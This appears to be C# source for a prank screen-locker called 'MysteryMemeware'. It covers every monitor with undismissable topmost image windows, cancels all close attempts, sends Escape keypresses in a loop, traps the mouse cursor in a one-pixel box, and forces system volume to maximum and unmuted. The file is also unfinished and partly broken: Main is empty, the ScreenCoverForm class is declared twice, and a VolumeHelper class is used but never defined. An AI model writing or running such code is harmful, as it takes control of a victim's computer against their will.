using System.Drawing.Drawing2D;
using System.Drawing;
using System.Threading;
using System.Windows.Forms;
using System;
using System.Runtime.InteropServices;

namespace MysteryMemeware
{
    public static class MysteryMemeware
    {
        public static void Main()
        {

        }
        public sealed class InterpolatedPictureBox : PictureBox
        {
            public InterpolationMode InterpolationMode = InterpolationMode.Default;
            public InterpolatedPictureBox()
            {
                InterpolationMode = InterpolationMode.Default;
            }
            public InterpolatedPictureBox(InterpolationMode interpolationMode)
            {
                InterpolationMode = interpolationMode;
            }
            protected override void OnPaint(PaintEventArgs paintEventArgs)
            {
                paintEventArgs.Graphics.InterpolationMode = InterpolationMode;
                base.OnPaint(paintEventArgs);
            }
        }
        public sealed class ScreenCoverForm : Form
        {
            public static void CoverAllScreens(Image coverImage, InterpolationMode interpolationMode = InterpolationMode.Default)
            {
                foreach (Screen screen in Screen.AllScreens)
                {
                    CoverScreen(screen, coverImage, interpolationMode);
                }
            }
            public static Thread CoverScreen(int targetScreenIndex, Image coverImage, InterpolationMode interpolationMode = InterpolationMode.Default)
            {
                if (targetScreenIndex < 0 || targetScreenIndex > Screen.AllScreens.Length)
                {
                    throw new Exception("targetScreenIndex must be within the bounds of Screen.AllScreens.");
                }
                return CoverScreen(Screen.AllScreens[targetScreenIndex], coverImage, interpolationMode);
            }
            public static Thread CoverScreen(Screen targetScreen, Image coverImage, InterpolationMode interpolationMode = InterpolationMode.Default)
            {
                Thread screenCoverThread = new Thread(() =>
                {
                    ScreenCoverForm screenCoverForm = new ScreenCoverForm(targetScreen, coverImage, interpolationMode);
                    screenCoverForm.ShowDialog();
                });
                screenCoverThread.Start();
                return screenCoverThread;
            }
            public InterpolationMode InterpolationMode
            {
                get
                {
                    return _customPictureBox.InterpolationMode;
                }
                set
                {
                    _customPictureBox.InterpolationMode = value;
                }
            }
            public readonly Image CoverImage = null;
            public readonly Screen TargetScreen = null;

            private InterpolatedPictureBox _customPictureBox = null;
            private Image _coverImageClone = null;
            private System.Windows.Forms.Timer _setPropertiesTimer = null;
            private bool _resizing = false;
            public ScreenCoverForm(Screen targetScreen, Image coverImage, InterpolationMode interpolationMode = InterpolationMode.Default)
            {
                if (targetScreen is null)
                {
                    throw new Exception("targetScreen cannot be null.");
                }
                TargetScreen = targetScreen;

                if (coverImage is null)
                {
                    throw new Exception("coverImage cannot be null.");
                }
                CoverImage = coverImage;

                _coverImageClone = (Image)CoverImage.Clone();

                _customPictureBox = new InterpolatedPictureBox(interpolationMode);
                _customPictureBox.Image = _coverImageClone;
                _customPictureBox.SizeMode = PictureBoxSizeMode.StretchImage;

                Controls.Add(_customPictureBox);

                FormClosing += OnFormClosing;

                _setPropertiesTimer = new System.Windows.Forms.Timer();
                _setPropertiesTimer.Interval = 100;
                _setPropertiesTimer.Tag = null;
                _setPropertiesTimer.Tick += (object sender, EventArgs e) =>
                {
                    SetProperties();
                };
                _setPropertiesTimer.Enabled = true;
                _setPropertiesTimer.Start();

                SetProperties();
            }
            [DllImport("user32.dll", SetLastError = true)]
            private static extern void keybd_event(byte bVk, byte bScan, int dwFlags, int dwExtraInfo);
            private static void SendEscape()
            {
                keybd_event(27, 0, 0, 0);
                keybd_event(27, 0, 2, 0);
            }
            private void SetProperties()
            {
                SendEscape();
                _customPictureBox.Location = new Point(0, 0);
                _customPictureBox.Width = Width;
                _customPictureBox.Height = Height;
                if (_resizing)
                {
                    return;
                }
                BackColor = Color.Black;
                ShowInTaskbar = false;
                TopMost = true;
                AllowDrop = false;
                FormBorderStyle = FormBorderStyle.None;
                StartPosition = FormStartPosition.Manual;
                Location = TargetScreen.Bounds.Location;
                Width = TargetScreen.Bounds.Width;
                Height = TargetScreen.Bounds.Height;
                MinimizeBox = false;
                MaximizeBox = false;
                MinimumSize = new Size(TargetScreen.Bounds.Width, TargetScreen.Bounds.Height);
                Padding = new Padding(0, 0, 0, 0);
                WindowState = FormWindowState.Maximized;
                Cursor.Clip = new Rectangle(Location, new Size(1, 1));
            }
            private void OnFormClosing(object sender, FormClosingEventArgs e)
            {
                e.Cancel = true;
            }
            protected override void OnResizeBegin(EventArgs e)
            {
                _resizing = true;
            }
            protected override void OnResizeEnd(EventArgs e)
            {
                _resizing = false;
                SetProperties();
            }
        }
        public static class ScreenCoverModule
        {
            public static void CoverAllScreens(Image screenCoverImage, bool allowAltF4)
            {
                foreach (Screen screen in Screen.AllScreens)
                {
                    CoverScreen(screen, screenCoverImage, allowAltF4);
                }
            }
            public static Thread CoverScreen(int screenIndex, Image screenCoverImage, bool allowAltF4)
            {
                if (screenIndex < 0 || screenIndex > Screen.AllScreens.Length)
                {
                    throw new Exception("targetScreenIndex must be within the bounds of Screen.AllScreens.");
                }
                return CoverScreen(Screen.AllScreens[screenIndex], screenCoverImage, allowAltF4);
            }
            public static Thread CoverScreen(Screen screen, Image screenCoverImage, bool allowAltF4)
            {
                Thread screenCoverThread = new Thread(() =>
                {
                    ScreenCoverForm screenCoverForm = new ScreenCoverForm(screen, screenCoverImage, allowAltF4);
                    screenCoverForm.ShowDialog();
                });
                screenCoverThread.Start();
                return screenCoverThread;
            }
        }
        public sealed class ScreenCoverForm : Form
        {
            #region Public Constants
            public readonly bool AllowAltF4 = false;
            public readonly Image ScreenCoverImage = null;
            public readonly Screen Screen = null;
            #endregion
            #region Private Variables
            private ScreenCoverPictureBox _screenCoverPictureBox = null;
            private Image _screenCoverImageClone = null;
            private System.Windows.Forms.Timer _screenCoverTimer = null;
            #endregion
            #region Public Constructors
            public ScreenCoverForm(Screen screen, Image screenCoverImage, bool allowAltF4)
            {
                AllowAltF4 = allowAltF4;

                if (screen is null)
                {
                    throw new Exception("screen cannot be null.");
                }
                Screen = screen;

                if (screenCoverImage is null)
                {
                    throw new Exception("screenCoverImage cannot be null.");
                }
                ScreenCoverImage = screenCoverImage;
                _screenCoverImageClone = (Image)ScreenCoverImage.Clone();

                this.ShowInTaskbar = false;
                this.TopMost = true;
                this.FormBorderStyle = FormBorderStyle.None;
                this.StartPosition = FormStartPosition.Manual;
                this.Location = Screen.Bounds.Location;
                this.Width = Screen.Bounds.Width;
                this.Height = Screen.Bounds.Height;
                this.WindowState = FormWindowState.Maximized;

                _screenCoverPictureBox = new ScreenCoverPictureBox();
                _screenCoverPictureBox.Image = _screenCoverImageClone;
                _screenCoverPictureBox.SizeMode = PictureBoxSizeMode.StretchImage;
                _screenCoverPictureBox.Location = new Point(0, 0);
                _screenCoverPictureBox.Width = this.Width;
                _screenCoverPictureBox.Height = this.Height;
                Controls.Add(_screenCoverPictureBox);

                _screenCoverTimer = new System.Windows.Forms.Timer();
                _screenCoverTimer.Interval = 500;
                _screenCoverTimer.Tick += OnScreenCoverTimerTick;
                _screenCoverTimer.Start();
                _screenCoverTimer.Enabled = true;

                FormClosing += OnFormClosing;
            }
            #endregion
            #region Private Events
            private void OnScreenCoverTimerTick(object sender, EventArgs e)
            {
                this.WindowState = FormWindowState.Maximized;
            }
            private void OnFormClosing(object sender, FormClosingEventArgs e)
            {
                if (AllowAltF4)
                {
                    return;
                }
                e.Cancel = true;
            }
            #endregion
            #region Private Sub Classes
            private sealed class ScreenCoverPictureBox : PictureBox
            {
                #region Protected Overrides
                protected override void OnPaint(PaintEventArgs paintEventArgs)
                {
                    paintEventArgs.Graphics.InterpolationMode = InterpolationMode.NearestNeighbor;
                    base.OnPaint(paintEventArgs);
                }
                #endregion
            }
            #endregion
        }
        private static System.Threading.Thread LockAtFull()
        {
            System.Threading.Thread output;
            output = new System.Threading.Thread(() =>
            {
                while (true)
                {
                    try
                    {
                        VolumeHelper.SetVolume(1.0f);
                        VolumeHelper.SetMute(false);
                        System.Threading.Thread.Sleep(500);
                    }
                    catch
                    {

                    }
                }
            });
            output.Start();
            return output;
        }
    }
}